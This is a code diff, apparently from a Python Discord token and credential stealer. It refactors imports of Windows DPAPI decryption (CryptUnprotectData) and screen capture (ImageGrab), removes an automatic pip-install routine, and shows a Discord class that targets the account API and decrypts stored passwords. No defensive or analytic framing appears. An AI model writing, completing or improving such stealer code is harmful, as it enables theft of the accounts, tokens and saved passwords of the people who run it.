@@ -4,29 +4,10 @@ import os
 import base64
 import json
 import re
+import requests
+from win32crypt import CryptUnprotectData
+from PIL import ImageGrab
 from datetime import datetime
-def install(package):
-    subprocess.check_call([sys.executable, "-m", "pip", "install", package])
-try:
-    import requests
-except ImportError:
-    install('requests')
-    import requests
-try:
-    from pathlib import Path
-except ImportError:
-    install('pathlib')
-    from pathlib import Path
-try:
-    from win32crypt import CryptUnprotectData
-except ImportError:
-    install('pywin32')
-    from win32crypt import CryptUnprotectData
-try:
-    from PIL import ImageGrab
-except ImportError:
-    install('Pillow')
-    from PIL import ImageGrab
 class Discord:
     def __init__(self):
         self.baseurl = "https://discord.com/api/v9/users/@me"
@@ -72,8 +53,6 @@ class Discord:
         try:
             iv = buff[3:15]
             payload = buff[15:]
-        
-            
             decrypted_pass = decrypted_pass[:-16].decode()
             return decrypted_pass
         except Exception:
